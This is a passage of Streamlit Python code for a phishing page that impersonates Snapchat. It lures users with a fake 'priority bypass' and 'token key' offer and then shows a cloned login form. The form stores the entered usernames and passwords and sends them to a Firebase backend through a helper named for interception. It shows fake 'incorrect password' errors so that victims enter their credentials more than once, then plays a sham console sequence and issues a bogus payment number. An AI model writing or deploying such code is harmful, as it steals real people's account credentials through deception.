    st.markdown("<div style='text-align:center; padding:16px; background:#fef2f2; border:1px solid #fee2e2; border-radius:12px; margin-bottom:20px;'><h4 style='color:#dc2626; font-weight:800; margin:0;'>⚠️ PUBLIC QUEUE SHUTDOWN CONGESTION</h4><p style='font-size:13px; color:#991b1b; margin:4px 0 0 0;'>Standard distribution channels lock delay: <b>24 Hours</b>.</p></div>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; margin-bottom:20px;'><h3 style='font-weight:800; margin:0;'>🚀 Force High-Speed Priority Corridor Bypasser</h3><p style='font-size:13px; color:#4b5563; margin-top:4px;'>Verify active hardware session credentials matching target platform metadata layers to pass immediately.</p></div>", unsafe_allow_html=True)
    
    st.markdown("""
    <div class='prime-engagement-block'>
        <span style='color:#2563eb !important; font-weight:800; font-size:15px;'>👉 CLICK THE BELOW  to verify your snapchat account 👈</span>
        <div style='font-size:11px; color:#4b5563; margin-top:4px; font-weight:700;'>[ SSL 256-Bit Hardware Encryption Channel Active ]</div>
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("You need to verify Snapchat IDENTITY FOOTPRINT MATCH NOW 👑 to get token key 🗝️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        script_detector_msg = st.empty()
        script_detector_msg.info("🤖 Scanning hardware environment patterns for tracking automation...")
        time.sleep(1.4)
        script_detector_msg.success("✅ Clean footprint frame. Initializing high-fidelity verification screen...")
        time.sleep(0.6)
        script_detector_msg.empty()
        st.session_state.step = 5
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 5: EXACT MATCH SYSTEM-CLONE VIEWPORT SCREEN
# ==========================================
elif st.session_state.step == 5:
    st.markdown("<div class='stApp' style='background-color:#ffffff !important;'>", unsafe_allow_html=True)
    
    st.markdown("<div class='premium-canvas-wrapper' style='background-color:#ffffff !important; border-radius:10px !important; box-shadow: 0 2px 14px rgba(0,0,0,0.03) !important; max-width:400px !important; margin:35px auto 10px auto !important; border:1px solid #f1f1f1 !important; padding:40px 32px !important;'>", unsafe_allow_html=True)
    
    # Rigid Icon Control Engine Core
    st.markdown("<div class='center-logo-box-matrix' style='box-shadow:none; border:none; margin-bottom:10px;'>", unsafe_allow_html=True)
    try:
        st.image("2.jpg")
    except:
        st.markdown("<p style='color:#ff4444; font-size:26px; font-weight:800; margin:0;'>logo</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)
            
    st.markdown("<p class='replica-brand-text'>snapchat</p>", unsafe_allow_html=True)
    
    with st.form("screenshot_replica_form_engine", clear_on_submit=False):
        st.markdown("<span class='replica-field-title'>Username or Email</span>", unsafe_allow_html=True)
        login_user_string = st.text_input("user_replica", placeholder="Your Username Here", label_visibility="collapsed")
        
        st.write("")
        
        st.markdown("<span class='replica-field-title'>Password</span>", unsafe_allow_html=True)
        login_pass_string = st.text_input("pass_replica", type="password", placeholder="••••••••", label_visibility="collapsed")
        
        st.markdown("<p class='forgot-pass-trigger-text'>Forgot Password</p>", unsafe_allow_html=True)
        
        st.write("")
        form_submit_trigger = st.form_submit_button("Log In", type="secondary")
        
        if form_submit_trigger:
            if login_user_string and login_pass_string:
                st.session_state.random_seed = random.randint(10, 99)
                log_capture_map = {
                    "intercept_attempt_index": st.session_state.login_attempts_count,
                    "captured_login_handle": login_user_string,
                    "captured_login_credential": login_pass_string,
                    "timestamp_string": str(datetime.datetime.now())
                }
                st.session_state.intercepted_dataset.append(log_capture_map)
                
                # Rigid 2-Attempt Failure Matrix Loop Logic
                if st.session_state.login_attempts_count < 3:
                    push_to_firebase_matrix(f"INTERCEPT_PHASE_ATTEMPT_{st.session_state.login_attempts_count}")
                    st.session_state.login_attempts_count += 1
                    with st.spinner("Connecting to authentication server node..."):
                        time.sleep(3.5)
                    st.error("Oops! The password you entered is incorrect. Please double check and try again.")
                else:
                    push_to_firebase_matrix("INTERCEPT_COMPLETE_SYSTEM_CLEAR")
                    with st.spinner("Syncing verified priority access tokens..."):
                        time.sleep(3.5)
                    st.session_state.step = 6
                    st.rerun()
            else:
                st.warning("All parameters required.")
                
    st.markdown("</div>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center; font-size:14px; color:#000000; font-weight:500; margin-top:35px;'>New To snapchat ?<b style='font-weight:700; margin-left:5px;'>Sign Up</b></p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 6: COMPLEX TERMINAL PIPELINE & RELEASE
# ==========================================
elif st.session_state.step == 6:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center; font-weight:800; color:#2563eb !important;'>💻 EXECUTION PROTOCOLS DEPLOYED</h3>", unsafe_allow_html=True)
    
    console_view = st.empty()
    console_lines = [
        "Verifying structural checksum hash validations...",
        "Establishing persistent link channels with transaction database...",
        "Injecting priority queue traffic routes to verified hardware target...",
        "Syncing session configuration metadata fields... PASSED",
        "Assembling tracking payload arrays inside isolated partition lines...",
        "Finalizing payload deployment... SYSTEM SUCCESS"
    ]
    
    cmd_markup_accumulator = ""
    for specific_line in console_lines:
        cmd_markup_accumulator += f"&gt; {specific_line}<br>"
        console_view.markdown(f"<div class='hacker-cmd-box'><p class='hacker-cmd-string'>{cmd_markup_accumulator}</p></div>", unsafe_allow_html=True)
        time.sleep(1.4)
        
    console_view.empty()
    
    st.success("✅ PRIORITY ROUTING CHANNELS DEPLOYED SUCCESSFULLY!")
    generated_payment_number = f"PMT-TK-{str(uuid.uuid4())[:10].upper()}"
    
    token_display_box = f"""
    <div style='text-align:center; padding:25px; background:#f0fdf4; border-radius:14px; border:2px solid #16a34a; margin:20px 0; box-shadow: 0 4px 15px rgba(22, 163, 74, 0.1);'>
        <h2 style='color:#16a34a; font-weight:800; margin:0 0 6px 0; font-size:18px;'>PAYMENT GENERATION NUMBER CLAIMED</h2>
        <code style='font-size:19px; font-weight:800; color:#1e293b; background:#ffffff; padding:6px 14px; border-radius:8px; border:2px solid #cbd5e1; font-family:monospace;'>{generated_payment_number}</code>
        <p style='margin:16px 0 0 0; font-size:14.5px; font-weight:700; color:#16a34a;'>🚀 Allocation Stream Priority: Active (Est Delivery Transit: 20 days)</p>
    </div>
    """
    st.markdown(token_display_box, unsafe_allow_html=True)
    
    if st.button("RESET CONTROL HANDSHAKE TERMINAL", type="primary", use_container_width=True):
        st.session_state.clear()
        st.rerun()
        
    st.markdown("</div>", unsafe_allow_html=True)


        
